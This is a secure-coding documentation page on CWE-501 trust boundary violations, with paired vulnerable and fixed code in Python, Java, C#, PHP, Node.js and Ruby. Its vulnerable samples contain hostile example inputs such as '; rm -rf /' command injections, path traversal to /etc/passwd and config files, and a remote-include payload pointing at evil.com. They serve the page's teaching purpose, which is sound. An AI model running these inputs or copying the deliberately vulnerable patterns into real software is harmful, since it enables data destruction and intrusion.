@@ -1,0 +1,651 @@
+---
+title: "Trust Boundary Violation"
+sidebarTitle: "Trust Boundary Violation (CWE-501)"
+description: "Mitigation for trust boundary violations where data from less trusted zones is used without validation in more trusted zones."
+icon: "handshake-slash"
+iconType: "solid"
+---
+
+## Overview
+
+A Trust Boundary Violation occurs when a program **blurs the line between trusted and untrusted data** or components. It happens when data received from a less trusted source (like user input, external APIs, or even different internal services with lower security guarantees) is used or processed by a more trusted component (like core business logic, security functions, or system commands) **without adequate validation or sanitization** at the boundary crossing. This can lead to various injection attacks, data corruption, or privilege escalation. ↔️🛡️❓
+
+---
+
+## Business Impact
+
+Trust boundary violations are fundamental design flaws that can enable a wide range of attacks:
+* **Injection Attacks (SQLi, XSS, Command Injection):** If data crossing a boundary isn't validated, it can carry malicious payloads executed by the trusted component.
+* **Privilege Escalation:** A less trusted component might trick a more trusted one into performing actions it shouldn't.
+* **Data Tampering:** Untrusted data might overwrite or corrupt trusted data stores.
+* **Logic Manipulation:** Incorrect assumptions about data validity can lead to flawed business logic execution.
+
+---
+
+<Card title="Reference Details" icon="book-open" iconType="solid">
+  **CWE ID:** [CWE-501](https://cwe.mitre.org/data/definitions/501.html)
+  **OWASP Top 10 (2021):** A04:2021 - Insecure Design
+  **Severity:** High (as it enables other critical vulnerabilities)
+</Card>
+
+---
+
+## Framework-Specific Analysis and Remediation
+
+This is a **design principle failure** rather than a specific code construct. It occurs when developers fail to identify the boundaries between different trust levels and neglect to implement validation checks at these points. Frameworks often provide tools for input validation (forms, serializers, validators), but it's the developer's responsibility to apply them rigorously whenever data crosses a trust boundary.
+
+**Key Remediation Principles:**
+1.  **Identify Boundaries:** Clearly define trust zones (e.g., user browser vs. web server, web server vs. database, internal service vs. external API).
+2.  **Validate on Entry:** Always validate and sanitize data *immediately* after it crosses from a less trusted to a more trusted zone. Assume all external data is malicious until proven otherwise.
+3.  **Principle of Least Privilege:** Components should only have the permissions necessary to function. A less trusted component shouldn't be able to directly call highly privileged functions in a more trusted one.
+4.  **Defense in Depth:** Implement validation at multiple layers.
+
+---
+
+<Tabs>
+  <Tab title="Python">
+    #### Framework Context
+    Failing to validate data from `request.POST`/`request.GET` (untrusted) before using it in database queries (trusted ORM) or system calls (trusted OS).
+
+    #### Vulnerable Scenario 1: Unvalidated Input to ORM
+    A Django view takes user input for filtering and passes it raw to the ORM, assuming the ORM handles all safety (it doesn't prevent logic errors).
+    ```python
+    # views/search.py
+    from .models import Product
+
+    def search_products(request):
+        # User input from GET parameter (less trusted)
+        min_price = request.GET.get('min_price')
+        # DANGEROUS: Assuming min_price is a valid number.
+        # If min_price is '0 OR 1=1 --', it might break certain DBs or logic.
+        # If min_price is extremely large, could cause DoS.
+        # The ORM prevents SQLi here, but the data itself isn't validated for type/range.
+        try:
+             # Implicit trust boundary crossing: request data -> database query logic
+             products = Product.objects.filter(price__gte=int(min_price))
+        except (ValueError, TypeError):
+             return HttpResponse("Invalid price", status=400)
+        # ... render products ...
+    ```
+
+    #### Vulnerable Scenario 2: Unvalidated Input to System Command
+    A utility function takes a filename from user input and passes it to a shell command.
+    ```python
+    # utils/file_processor.py
+    import os
+
+    def get_file_metadata(user_filename):
+        # DANGEROUS: user_filename (less trusted) is used directly in a shell command (highly trusted).
+        # Input: user_filename = "; rm -rf /"
+        # Command becomes: "exiftool ; rm -rf /"
+        # Trust boundary violation: user input -> OS command execution
+        command = f"exiftool {user_filename}" # Assume exiftool is installed
+        try:
+             result = os.popen(command).read() # Using popen for simplicity, subprocess is better but still vulnerable here
+             return result
+        except Exception as e:
+             print(f"Error executing command: {e}")
+             return None
+    ```
+
+    #### Mitigation and Best Practices
+    Use Django Forms or DRF Serializers to validate *all* incoming request data (type, range, format, allow-lists) *before* passing it to business logic, ORM methods, or system calls. For shell commands, use `shlex.quote()` and the `subprocess` module with argument lists, not formatted strings.
+
+    #### Secure Code Example
+    ```python
+    # forms.py (Django Form for Validation)
+    from django import forms
+
+    class ProductSearchForm(forms.Form):
+        # SECURE: Defines validation rules at the boundary.
+        min_price = forms.IntegerField(min_value=0, required=False)
+        # Add other fields as needed
+
+    # views/search.py (Secure)
+    def search_products_secure(request):
+        form = ProductSearchForm(request.GET)
+        if form.is_valid():
+            # SECURE: Data is validated before use.
+            min_price = form.cleaned_data.get('min_price')
+            query = Product.objects.all()
+            if min_price is not None:
+                query = query.filter(price__gte=min_price)
+            # ... render products ...
+        else:
+            return HttpResponse(f"Invalid input: {form.errors}", status=400)
+
+    # utils/file_processor.py (Secure)
+    import subprocess
+    import shlex
+
+    def get_file_metadata_secure(user_filename):
+        # SECURE: Validate filename format (e.g., alphanumeric, specific extension)
+        if not is_safe_filename(user_filename): # Assume is_safe_filename exists
+             raise ValueError("Invalid filename")
+        # SECURE: Use argument list, quote prevents shell injection.
+        # Boundary is crossed, but input is sanitized for the specific trusted function (shell).
+        command_args = ["exiftool", user_filename]
+        try:
+            # Using subprocess with list prevents shell interpretation of user_filename
+            result = subprocess.run(command_args, capture_output=True, text=True, check=True)
+            return result.stdout
+        except subprocess.CalledProcessError as e:
+             print(f"Command failed: {e}")
+             return None
+        except FileNotFoundError:
+             print("exiftool not found")
+             return None
+    ```
+
+    #### Testing Strategy
+    Identify trust boundaries (HTTP requests, file uploads, API calls, database interactions, shell execution). Analyze the data crossing these boundaries. Check if validation (type, format, range, allow-list) occurs *immediately* upon receiving data from the less trusted side. Test with unexpected data types, malicious characters, and injection payloads relevant to the receiving component (e.g., SQL syntax for ORM, shell commands for `subprocess`).
+  </Tab>
+  <Tab title="Java">
+    #### Framework Context
+    Taking data from `HttpServletRequest` parameters or API calls (untrusted) and using it directly in database queries (via JDBC/JPA - trusted), reflection calls (trusted), or file system operations (trusted).
+
+    #### Vulnerable Scenario 1: Unvalidated Input in JPA Query
+    A search function uses user input directly in a `LIKE` clause, assuming JPA prevents SQLi (which it does) but not validating the input's nature.
+    ```java
+    // repository/ProductRepository.java
+    // Assume using Spring Data JPA
+    public interface ProductRepository extends JpaRepository<Product, Long> {
+         // Using @Query might bypass some automatic parameter handling if not careful
+         @Query("SELECT p FROM Product p WHERE p.name LIKE %?1%") // Parameter marker is good for SQLi
+         List<Product> findByNameContaining(String name);
+    }
+
+    // service/ProductService.java
+    public List<Product> searchByName(String userInputName) {
+        // DANGEROUS: Input not validated for length or wildcards.
+        // Input: userInputName = "%" -> Query becomes LIKE %%% (selects all)
+        // Might cause performance issues (DoS) or return unintended data.
+        // Trust boundary: HTTP parameter -> Database query logic
+        return productRepository.findByNameContaining(userInputName);
+    }
+    ```
+
+    #### Vulnerable Scenario 2: Unvalidated Class Name for Reflection
+    Using user input to dynamically load and instantiate a class.
+    ```java
+    // util/PluginLoader.java
+    public Object loadPlugin(String userProvidedClassName) throws Exception {
+        // DANGEROUS: userProvidedClassName (untrusted) used to load a class (trusted operation).
+        // Attacker could provide "java.lang.Runtime" or other sensitive classes.
+        // Trust boundary violation: User input -> Class loading/instantiation
+        Class<?> clazz = Class.forName(userProvidedClassName);
+        // Further actions using reflection could lead to RCE.
+        return clazz.getDeclaredConstructor().newInstance();
+    }
+    ```
+
+    #### Mitigation and Best Practices
+    Validate all input from untrusted sources (request parameters, headers, bodies) using validation frameworks (like Bean Validation/`javax.validation`) or manual checks *before* using the data. For database queries, validate data types, lengths, and potentially escape wildcards (`%`, `_`) if allowing partial matches. For reflection, use a strict allow-list of permitted class names.
+
+    #### Secure Code Example
+    ```java
+    // service/ProductService.java (Secure)
+    public List<Product> searchByNameSecure(String userInputName) {
+        // SECURE: Validate input at the boundary.
+        if (userInputName == null || userInputName.length() < 3 || userInputName.length() > 50) {
+            throw new IllegalArgumentException("Invalid search term length");
+        }
+        // SECURE: Escape wildcards if the query allows them, or disallow them via validation.
+        String safeName = userInputName
+            .replace("!", "!!")
+            .replace("%", "!%")
+            .replace("_", "!_")
+            .replace("[", "!["); // JPA LIKE escape char is '!' by default
+
+        // Now safe to pass to the repository method
+        return productRepository.findByNameContaining(safeName);
+    }
+
+    // util/PluginLoader.java (Secure)
+    private static final Set<String> ALLOWED_PLUGINS = Set.of(
+        "com.myapp.plugins.PluginA",
+        "com.myapp.plugins.PluginB"
+    );
+
+    public Object loadPluginSecure(String userProvidedClassName) throws Exception {
+        // SECURE: Validate class name against a strict allow-list.
+        if (!ALLOWED_PLUGINS.contains(userProvidedClassName)) {
+            throw new SecurityException("Disallowed plugin class: " + userProvidedClassName);
+        }
+        // Now it's safe to load the class
+        Class<?> clazz = Class.forName(userProvidedClassName);
+        return clazz.getDeclaredConstructor().newInstance();
+    }
+    ```
+
+    #### Testing Strategy
+    Identify trust boundaries. Check if input validation (Bean Validation annotations like `@Size`, `@Pattern`, custom validators) is applied to DTOs or parameters received from external sources *before* they are used by services, repositories, or system functions. Test with invalid types, lengths, formats, wildcards (`%`), reflection payloads (`java.lang.Runtime`), etc.
+  </Tab>
+  <Tab title=".NET(C#)">
+    #### Framework Context
+    Passing data from `HttpRequest.Query`/`Form`/`Route` (untrusted) directly to Entity Framework queries (trusted), file operations (trusted), or reflection (trusted).
+
+    #### Vulnerable Scenario 1: Unvalidated Input to EF Query
+    Sorting data based on a user-provided column name without validation.
+    ```csharp
+    // Controllers/DataController.cs
+    public async Task<IActionResult> GetData(string sortBy)
+    {
+        // DANGEROUS: sortBy (untrusted) determines the column name.
+        // While EF Core tries to prevent SQLi in OrderBy, this relies on internal
+        // implementation and might be bypassed or cause errors if `sortBy` is malicious.
+        // Trust boundary violation: Query parameter -> Database query structure
+        // Input: sortBy = "NonExistentColumn" -> throws Exception, information leak?
+        // Input: sortBy = "Users.PasswordHash" -> potential data leak depending on query
+        var query = _context.Items.OrderBy(i => EF.Property<object>(i, sortBy)); // Using EF.Property
+
+        // A simpler, more directly injectable (if not using EF Core properly) version:
+        // string sql = $"SELECT * FROM Items ORDER BY {sortBy}"; // Classic SQLi if sortBy not validated
+        // var items = await _context.Items.FromSqlRaw(sql).ToListAsync();
+
+        var items = await query.ToListAsync();
+        return Ok(items);
+    }
+    ```
+
+    #### Vulnerable Scenario 2: Unvalidated Path for File Access
+    Reading a file based on a user-provided path parameter.
+    ```csharp
+    // Controllers/FileViewController.cs
+    public IActionResult ViewLog(string logName)
+    {
+        // DANGEROUS: logName (untrusted) used to construct file path (trusted operation).
+        // Input: logName = "../../appsettings.json" (Path Traversal)
+        // Trust boundary violation: Route parameter -> File system access
+        var basePath = "/var/log/applogs/"; // Assume configured securely
+        var fullPath = Path.GetFullPath(Path.Combine(basePath, logName)); // GetFullPath helps normalize
+
+        // Still dangerous without validation check against base path
+        if (!fullPath.StartsWith(Path.GetFullPath(basePath)))
+        {
+             return Forbid("Access denied."); // Basic check, but GetFullPath can be tricky
+        }
+
+        // Need better validation before this point
+        if (!System.IO.File.Exists(fullPath)) return NotFound();
+        var content = System.IO.File.ReadAllText(fullPath);
+        return Content(content, "text/plain");
+    }
+    ```
+
+    #### Mitigation and Best Practices
+    Use model binding with validation attributes (`[Required]`, `[StringLength]`, `[RegularExpression]`) on controller action parameters or DTOs. Validate file paths carefully: ensure the final canonical path is within the intended base directory. For dynamic sorting/filtering, map user input (`sortBy="name"`) to known, safe property names (`actualColumn = "ProductName"`).
+
+    #### Secure Code Example
+    ```csharp
+    // Controllers/DataController.cs (Secure Sorting)
+    public async Task<IActionResult> GetDataSecure(string sortBy)
+    {
+        var query = _context.Items.AsQueryable();
+
+        // SECURE: Map user input to known, safe column names.
+        string sortColumn = sortBy?.ToLowerInvariant() switch
+        {
+            "name" => nameof(Item.Name), // Use nameof for safety
+            "price" => nameof(Item.Price),
+            _ => nameof(Item.Id) // Default sort column
+        };
+
+        // Use System.Linq.Dynamic.Core for string-based OrderBy safely, or build dynamically
+        // Example using basic switch (limited but safe):
+        query = sortColumn switch
+        {
+             nameof(Item.Name) => query.OrderBy(i => i.Name),
+             nameof(Item.Price) => query.OrderBy(i => i.Price),
+             _ => query.OrderBy(i => i.Id)
+        };
+        // Trust boundary crossed, but input validated via allow-list mapping.
+
+        var items = await query.ToListAsync();
+        return Ok(items);
+    }
+
+    // Controllers/FileViewController.cs (Secure Path Handling)
+    public IActionResult ViewLogSecure(string logName)
+    {
+        // SECURE: Basic validation - disallow path characters. More specific validation is better.
+        if (string.IsNullOrEmpty(logName) || logName.Contains('/') || logName.Contains('\\') || logName.Contains(".."))
+        {
+            return BadRequest("Invalid log name.");
+        }
+        var basePath = Path.GetFullPath("/var/log/applogs/"); // Ensure base path ends with separator
+        var fullPath = Path.Combine(basePath, logName);
+
+        // SECURE: Stronger check: ensure the resulting full path starts with the base path.
+        // Use Path.GetFullPath on both for reliable comparison.
+        if (!fullPath.StartsWith(basePath, StringComparison.OrdinalIgnoreCase))
+        {
+            return Forbid("Access denied.");
+        }
+
+        if (!System.IO.File.Exists(fullPath)) return NotFound();
+        var content = System.IO.File.ReadAllText(fullPath);
+        return Content(content, "text/plain");
+    }
+    ```
+
+    #### Testing Strategy
+    Identify trust boundaries. Check that model binding validation attributes are used on inputs. For file paths, check for robust validation ensuring the path stays within the intended directory. For dynamic queries, ensure user input is mapped to safe values or parameters, not directly concatenated. Test with invalid input, path traversal (`../`), reflection payloads, and SQL-like syntax (even if EF prevents SQLi, check for errors/logic bypass).
+  </Tab>
+  <Tab title="PHP">
+    #### Framework Context
+    Taking data from `$_GET`/`$_POST`/`Request` (untrusted) and using it directly in database queries (trusted), `include`/`require` paths (trusted), or shell commands (trusted).
+
+    #### Vulnerable Scenario 1: Unvalidated Input for `include`
+    Including a file based on user input, leading to Local File Inclusion (LFI) or Remote File Inclusion (RFI).
+    ```php
+    <?php
+    // page_loader.php
+    $page = $_GET['page'] ?? 'home';
+
+    // DANGEROUS: $page (untrusted) used directly in file path (trusted operation).
+    // Input: page=../../../../etc/passwd -> LFI
+    // Input: page=[http://evil.com/shell.txt](http://evil.com/shell.txt) -> RFI (if allow_url_include=On)
+    // Trust boundary: GET parameter -> File system include path
+    include($page . '.php');
+    ?>
+    ```
+
+    #### Vulnerable Scenario 2: Unvalidated Input to Database Query (Logic Flaw)
+    Filtering orders based on a status provided by the user, without checking if the user is *allowed* to see orders with that status.
+    ```php
+    // controllers/OrderController.php
+    public function index(Request $request) {
+        $status = $request->input('status', 'pending'); // Untrusted input
+
+        // DANGEROUS: Assumes user is allowed to view any status they provide.
+        // An attacker might request ?status=shipped_admin_hold
+        // Trust boundary violation: User input -> Business logic decision/DB query filter
+        $orders = Order::where('user_id', auth()->id())
+                       ->where('status', $status) // Status not validated against user role
+                       ->get();
+        return view('orders.index', ['orders' => $orders]);
+    }
+    ```
+
+    #### Mitigation and Best Practices
+    Validate *all* external input. For file includes, use a strict allow-list of permitted filenames and ensure the path is constrained. For database queries and business logic, validate input against allowed values, formats, and user permissions *before* using it. Use Laravel's Request Validation.
+
+    #### Secure Code Example
+    ```php
+    <?php
+    // page_loader_secure.php
+    $page = $_GET['page'] ?? 'home';
+
+    // SECURE: Validate against an allow-list of known pages.
+    $allowedPages = ['home', 'about', 'contact'];
+    if (!in_array($page, $allowedPages)) {
+        $page = 'home'; // Default to safe page or show error
+    }
+    // SECURE: Use validated input. Ensure base path is secure.
+    $baseDir = __DIR__ . '/pages/'; // Example base directory
+    // Prevent directory traversal just in case (defense-in-depth)
+    $page = basename($page);
+    include($baseDir . $page . '.php');
+    ?>
+
+    // controllers/OrderController.php (Secure)
+    public function index(Request $request) {
+        // Use Laravel validation
+        $validated = $request->validate([
+            // SECURE: Validate status against allowed values for the user's role.
+            'status' => ['sometimes', 'string', Rule::in($this->getAllowedStatusesForUser(auth()->user()))]
+        ]);
+
+        $status = $validated['status'] ?? 'pending'; // Use validated data or safe default
+
+        $orders = Order::where('user_id', auth()->id())
+                       ->where('status', $status)
+                       ->get();
+        return view('orders.index', ['orders' => $orders]);
+    }
+
+    private function getAllowedStatusesForUser(User $user) : array {
+        if ($user->isAdmin()) {
+            return ['pending', 'shipped', 'completed', 'cancelled', 'shipped_admin_hold'];
+        }
+        return ['pending', 'shipped', 'completed', 'cancelled']; // Regular user statuses
+    }
+    ```
+
+    #### Testing Strategy
+    Identify trust boundaries. Check where `$_GET`, `$_POST`, `Request::input()` etc. are used. Verify that validation (Laravel validation rules, `filter_var`, allow-lists, `basename()`) is applied before the data is used in file paths, database queries, or system calls. Test with path traversal (`../`), LFI/RFI payloads, invalid status values, etc.
+  </Tab>
+  <Tab title="Node.js">
+    #### Framework Context
+    Passing data from `req.query`/`req.body`/`req.params` (untrusted) to database queries (trusted), file system operations (`fs` module - trusted), or child processes (`child_process` - trusted).
+
+    #### Vulnerable Scenario 1: Unvalidated Input to File System
+    Reading a file specified by a query parameter.
+    ```javascript
+    // app.js
+    const fs = require('fs');
+    const path = require('path');
+
+    app.get('/get-file', (req, res, next) => {
+        const filename = req.query.filename; // Untrusted input
+        // DANGEROUS: filename used directly to read file.
+        // Input: filename=../../../../etc/passwd (Path Traversal)
+        // Trust boundary: Query param -> File system read path
+        const filePath = path.join(__dirname, 'user_files', filename);
+        fs.readFile(filePath, 'utf8', (err, data) => {
+            if (err) return next(err); // Error handling might leak path info
+            res.type('text/plain').send(data);
+        });
+    });
+    ```
+
+    #### Vulnerable Scenario 2: Unvalidated Input to Child Process
+    Using user input as part of a command executed via `child_process`.
+    ```javascript
+    // app.js
+    const { exec } = require('child_process');
+
+    app.get('/run-script', (req, res) => {
+        const scriptName = req.query.script; // Untrusted input
+        // DANGEROUS: scriptName concatenated into command string.
+        // Input: scriptName = "my_script.sh; rm -rf /" (Command Injection)
+        // Trust boundary: Query param -> OS command execution
+        exec(`bash /scripts/${scriptName}`, (error, stdout, stderr) => {
+             if (error) { return res.status(500).send(stderr); }
+             res.send(stdout);
+        });
+    });
+    ```
+
+    #### Mitigation and Best Practices
+    Validate all incoming data using libraries like `express-validator` or manual checks. For file paths, normalize the path and ensure it stays within the intended base directory. For child processes, **never** use `exec` with concatenated user input; use `execFile` or `spawn` with an array of arguments, and validate the command/script name against an allow-list.
+
+    #### Secure Code Example
+    ```javascript
+    // app.js (Secure File Read)
+    const fs = require('fs');
+    const path = require('path');
+
+    const BASE_USER_DIR = path.resolve(__dirname, 'user_files'); // Resolve to absolute path
+
+    app.get('/get-file-secure', (req, res, next) => {
+        const filename = req.query.filename; // Untrusted
+
+        // SECURE: Basic validation - prevent path characters
+        if (!filename || filename.includes('/') || filename.includes('\\') || filename.includes('..')) {
+            return res.status(400).send('Invalid filename.');
+        }
+
+        const filePath = path.join(BASE_USER_DIR, filename); // Construct path
+
+        // SECURE: Normalize and verify path is within BASE_USER_DIR
+        const resolvedPath = path.resolve(filePath);
+        if (!resolvedPath.startsWith(BASE_USER_DIR + path.sep) && resolvedPath !== BASE_USER_DIR) {
+             return res.status(403).send('Access denied.');
+        }
+
+        fs.readFile(resolvedPath, 'utf8', (err, data) => {
+            if (err) {
+                 console.error(err); // Log error server-side
+                 return res.status(404).send('File not found.'); // Generic error
+            }
+            res.type('text/plain').send(data);
+        });
+    });
+
+    // app.js (Secure Child Process)
+    const { execFile } = require('child_process'); // Use execFile, not exec
+
+    const ALLOWED_SCRIPTS = ['script1.sh', 'script2.sh']; // Allow-list
+
+    app.get('/run-script-secure', (req, res) => {
+        const scriptName = req.query.script; // Untrusted
+
+        // SECURE: Validate against allow-list
+        if (!scriptName || !ALLOWED_SCRIPTS.includes(scriptName)) {
+            return res.status(400).send('Invalid script name.');
+        }
+
+        const scriptPath = path.join('/scripts', scriptName); // Construct path
+
+        // SECURE: Use execFile with path and arguments array (if any).
+        // Input is treated as filename, not shell commands.
+        execFile('bash', [scriptPath], (error, stdout, stderr) => {
+             if (error) {
+                 console.error(stderr);
+                 return res.status(500).send('Script execution failed.');
+             }
+             res.send(stdout);
+        });
+    });
+    ```
+
+    #### Testing Strategy
+    Identify trust boundaries. Check if validation middleware (e.g., `express-validator`) is used. Examine `fs` operations for path validation against a base directory. Examine `child_process` calls: ensure `execFile`/`spawn` are used with argument arrays, not `exec` with concatenated strings. Test with path traversal (`../`), command injection (`;`, `&&`, `|`), and other injection payloads relevant to the sink.
+  </Tab>
+  <Tab title="Ruby">
+    #### Framework Context
+    Passing data from `params` (untrusted) directly to database finders (trusted ORM), file operations (`File.open`, `IO.read` - trusted), or command execution (`Kernel.system`, backticks `` ` `` - trusted).
+
+    #### Vulnerable Scenario 1: Unvalidated Input to File Path
+    ```ruby
+    # app/controllers/logs_controller.rb
+    class LogsController < ApplicationController
+      def show
+        log_file = params[:file] # Untrusted
+        base_dir = Rails.root.join('log')
+
+        # DANGEROUS: log_file used directly.
+        # Input: file = "../../config/database.yml" (Path Traversal)
+        # Trust boundary: params -> File system path
+        full_path = File.join(base_dir, log_file)
+
+        # Basic check might not be enough if base_dir is complex
+        # unless File.expand_path(full_path).start_with?(File.expand_path(base_dir))
+        #   render status: :forbidden and return
+        # end
+
+        if File.exist?(full_path)
+           render plain: File.read(full_path)
+        else
+           render status: :not_found
+        end
+      end
+    end
+    ```
+
+    #### Vulnerable Scenario 2: Unvalidated Input to Kernel.system
+    ```ruby
+    # app/controllers/tools_controller.rb
+    class ToolsController < ApplicationController
+      def ping
+        host = params[:host] # Untrusted
+        # DANGEROUS: host interpolated directly into command string.
+        # Input: host = "8.8.8.8; rm -rf /" (Command Injection)
+        # Trust boundary: params -> OS command execution
+        command = "ping -c 1 #{host}"
+        begin
+           @result = `#{command}` # Backticks execute command
+           # Or: Kernel.system(command)
+        rescue => e
+           @error = e.message
+        end
+        render :ping_result
+      end
+    end
+    ```
+
+    #### Mitigation and Best Practices
+    Validate all `params` data before use. For file paths, use `File.expand_path` and check `start_with?` against an expanded base directory. Use allow-lists for filenames. For system commands, **never** interpolate user input directly into the command string. Use methods like `Open3.capture3` or `system` with **separate arguments**, not a single string. Sanitize arguments with `Shellwords.escape` if they must be part of the command string (less safe).
+
+    #### Secure Code Example
+    ```ruby
+    # app/controllers/logs_controller.rb (Secure)
+    class LogsController < ApplicationController
+      LOG_BASE_DIR = Rails.root.join('log').to_s.freeze
+      ALLOWED_LOGS = ['development.log', 'production.log'].freeze # Allow-list
+
+      def show
+        log_file = params[:file] # Untrusted
+
+        # SECURE: Validate against allow-list and prevent traversal.
+        safe_filename = File.basename(log_file.to_s) # Remove directory info
+        unless ALLOWED_LOGS.include?(safe_filename)
+           render status: :forbidden, plain: "Log file not allowed."
+           return
+        end
+
+        full_path = File.join(LOG_BASE_DIR, safe_filename)
+        # SECURE: Double check path hasn't escaped (defense-in-depth)
+        unless File.expand_path(full_path).start_with?(LOG_BASE_DIR)
+             render status: :forbidden, plain: "Access denied."
+             return
+        end
+
+        if File.exist?(full_path)
+           render plain: File.read(full_path)
+        else
+           render status: :not_found
+        end
+      end
+    end
+
+    # app/controllers/tools_controller.rb (Secure)
+    require 'open3'
+    require 'shellwords' # For escaping if needed, but separate args preferred
+
+    class ToolsController < ApplicationController
+      def ping
+        host = params[:host] # Untrusted
+
+        # SECURE: Validate host format (e.g., IP address or allowed hostname regex)
+        unless host =~ /\A(?:[0-9]{1,3}\.){3}[0-9]{1,3}\z|\A[a-zA-Z0-9\-\.]+\z/ # Example regex
+           @error = "Invalid host format."
+           render :ping_result, status: :bad_request and return
+        end
+
+        # SECURE: Use system with separate arguments. Input is treated as one argument.
+        # This prevents shell metacharacters in `host` from being interpreted.
+        command = "ping"
+        args = ["-c", "1", host]
+
+        begin
+           stdout_str, stderr_str, status = Open3.capture3(command, *args)
+           if status.success?
+             @result = stdout_str
+           else
+             @error = stderr_str
+           end
+        rescue => e
+           @error = e.message
+        end
+        render :ping_result
+      end
+    end
+    ```
+
+    #### Testing Strategy
+    Identify trust boundaries (params -> DB, File, Kernel.system, backticks). Check for validation on `params`. Test file access with path traversal (`../`). Test command execution points with shell metacharacters (`;`, `|`, `&&`, `` ` ``, `$(...)`). Check database interactions for logic flaws based on unvalidated input.
+  </Tab>
+</Tabs>
